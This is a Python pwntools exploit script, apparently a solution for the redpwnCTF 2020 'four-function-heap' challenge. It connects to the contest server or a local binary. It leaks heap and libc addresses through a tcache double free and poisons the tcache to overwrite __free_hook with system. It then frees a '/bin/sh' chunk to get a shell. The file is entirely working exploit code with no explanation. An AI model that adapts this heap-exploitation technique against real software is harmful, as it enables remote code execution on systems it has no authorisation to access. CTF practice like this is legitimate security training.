from pwn import *
import sys

bin = ELF('./four-function-heap')
# this is libc in my ubuntu 18-04
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

def recv_wait(r, i=0.5):
    r.recvrepeat(i)

def alloc(r, size, data='A'):
    recv_wait(r)
    r.sendline('1')
    recv_wait(r)
    r.sendline('0')
    recv_wait(r)
    r.sendline(str(size))
    recv_wait(r)
    r.sendline(data)

def free(r):
    recv_wait(r)
    r.sendline('2')
    recv_wait(r)
    r.sendline('0')

def show(r):
    recv_wait(r)
    r.sendline('3')
    recv_wait(r)
    r.sendline('0')

def leak_libcbase(r):
    fake_chunk_size = 0x200
    
    alloc(r, fake_chunk_size)
    for i in range(3):
        free(r)
    show(r)
    leak_heap = u64(r.recv(6).ljust(8, b'\x00'))
    heap_offset = 0x260
    heap_base = leak_heap - heap_offset
    log.info("heap_base: " + hex(heap_base))
    alloc(r, fake_chunk_size, p64(heap_base+0x10))
    alloc(r, fake_chunk_size, p64(leak_heap)*0x30)
    alloc(r, fake_chunk_size, p64(0) + p64(0x0000000000000007) + p64(0) * 2 + p64(0x0000000007000000) + p64(0) * 11 + p64(leak_heap)*2)
    free(r)
    show(r)
    leak_libc = u64(r.recv(6).ljust(8, b'\x00'))
    libc_offset = 0x3ebca0
    libc.address = leak_libc - libc_offset
    log.info("libc base: " + hex(libc.address))

def run_shell(r):
    t = 0x90
    alloc(r, t, p64(libc.symbols['__free_hook'] - 8))
    alloc(r, t)
    alloc(r, t, b'/bin/sh\x00' + p64(libc.symbols['system']))
    free(r)
    r.interactive()

def attack(r):
    leak_libcbase(r)
    run_shell(r)

if __name__ == "__main__":
    r = None
    if sys.argv[1] == 'r':
        IP = '2020.redpwnc.tf'
        PORT = 31774
        r = remote(IP, PORT)
    elif sys.argv[1] == 'l':
        r = process('./four-function-heap')
    else:
        log.error("Usage: python3 exploit.py [r | l]")

    attack(r)
